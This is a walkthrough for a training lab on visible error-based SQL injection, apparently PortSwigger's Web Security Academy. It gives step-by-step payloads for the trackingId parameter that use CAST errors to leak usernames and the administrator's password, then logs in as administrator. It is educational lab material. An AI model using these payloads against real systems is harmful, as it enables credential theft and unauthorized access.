# SQL Injection Lab 13 - Visible Error-Based SQL Injection

## Manual Solution

### 1. Access the Lab
- Access the Web Security Academy lab.

### 2. Initial Setup
- Open Burp Suite and intercept a GET request to the website.
- Send the captured request to the Repeater for testing.

### 3. Verify SQL Injection Vulnerability
- Add a single quote to the `trackingId` parameter: `'`
  - Response shows an error: "Unterminated string literal started at position."
  
- Add a comment (`--`) to the `trackingId` parameter: `'--`
  - No error appears, confirming the query is now valid.

### 4. Test Subquery Functionality
- Test administrator user existence with:
  - `' AND 1=CAST((SELECT 1) AS int)--`
  - No error in response, confirming valid query syntax.

### 5. Username Extraction Attempt
- Attempt to retrieve usernames with:
  - `' AND 1=CAST((SELECT username FROM users) AS int)--`
  - Error received: "Unterminated string literal started at position."
  - Note: Comment syntax appears to be blocked with default trackingId.

### 6. TrackingId Modification
- Change default trackingId to empty string to enable comment functionality.

### 7. Username Enumeration
- Execute username extraction query:
  - `' AND 1=CAST((SELECT username FROM users) AS int)--`
  - Error received: "More than one row returned by a subquery used as an expression."

### 8. Single Username Extraction
- Retrieve first username using LIMIT:
  - `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
  - Error reveals username: "Invalid input syntax for type integer: 'administrator'"

### 9. Password Extraction
- Extract administrator password:
  - `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
  - Error reveals password: "Invalid input syntax for type integer: '[ADMINISTRATOR_PASSWORD]'"

### 10. Authentication
- Use extracted credentials to login as administrator
- Verify successful access to admin panel

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python sqli_lab_10.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
